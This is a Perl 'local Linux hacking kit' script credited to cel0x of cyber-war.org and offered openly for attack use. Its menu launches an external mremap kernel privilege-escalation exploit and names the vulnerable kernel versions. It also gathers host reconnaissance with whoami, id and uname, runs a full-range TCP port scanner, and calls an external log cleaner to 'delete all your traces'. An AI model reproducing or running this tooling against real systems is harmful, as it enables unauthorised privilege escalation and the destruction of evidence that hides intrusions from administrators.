#!/usr/bin/perl

###################################
# (Local) Hacking Kit             #
#     made by cel0x               #
#                                 #
# www.cyber-war.org               #
#                                 #
# greets to - Crypt0              #
#             Mighty              #
# E-Mail - celox@cyber-war.org    #
###################################

system("clear");

if (! defined $ARGV[0])
{
print "+===============================================+\n";
print "+   Program [(Local) Linux Hacking Ki]t         +\n";
print "+                                               +\n";
print "+   Version [0.2]                               +\n";
print "+   Website [www.cyber-war.org]                 +\n";
print "+   E-Mail  [celox [at] cyber-war [dot] org]    +\n";
print "+                                               +\n";
print "+              Have fun with this               +\n";
print "+===============================================+\n";

print"\n";

print "-------------------\n";
print "Option Menu:\n";
print "-------------------\n\n";
print "-k \tKernel exploit Vulnerable kernel versions are all <= 2.2.25, <= 2.4.24 and <= 2.6.2\n\n";

print "-i \tSystem info: Username, ID, Uptime, Kernel information, HDD space\n\n";

print "-s \tPortscanner\n\n";

print "-d \tdeletes all your traces\n\n";
exit 0;
}

($optie = $ARGV[0]);

# -i optie #

if ($optie eq "-i")
{
 print "Username:\n";
 system("whoami\n\n");
 
 print "\n";

 print "ID:\n"; 
 system("id\n\n");
 print "\n";

 print "Uptime:\n";
 system("uptime\n\n");
 print "\n";

 print "Kernel Information:\n";
 system("uname -a\n\n");
 print "\n"; 
 
 system("df -h\n\n");
 print "\n";

 exit();
}

# -k optie #

if ($optie eq "-k")
{
 system("./mremap\n");

 exit();
}

# -s optie #

if ($optie eq "-s")
{

use IO::Socket::INET

system "clear";


print "()()()()()()()()()()()()()()()()()()()\n";
print "()         CyberScanner v0.1        ()\n";
print "()()()()()()()()()()()()()()()()()()()\n";

print "IP: ";
$host=<STDIN>;
chomp($host);

print "\n\n";

print "Startport: 0\n";
$startport = 0;

print "Endport: 65535\n";
$endport = 65535;

$open = 0;
$closed = 0;
print "Start scanning... \n";
while($startport <= $endport) {
if(my $x = new IO::Socket::INET (
                                 PeerAddr => $host,
                                 PeerPort => $startport,
                                 Proto => 'tcp'))
                                 {
                                                 $open++;
                                                 print "Port $startport on target $host \n";
                                 }
                                 else
                                 {
                                                 $closed--;
                                 }
                                 $startport++;
                                 }
                                 print "\n";
                                 print "Info on target $host \n";
                                 print "------------------------------ \n";
                                 print "Closed Ports: $closed \n";
                                 print "Open Ports  : $open \n";

 exit()

}

if ($optie eq "-d")
{
system("./llc -r \n");
system("./llc -R \n");
}

exit();
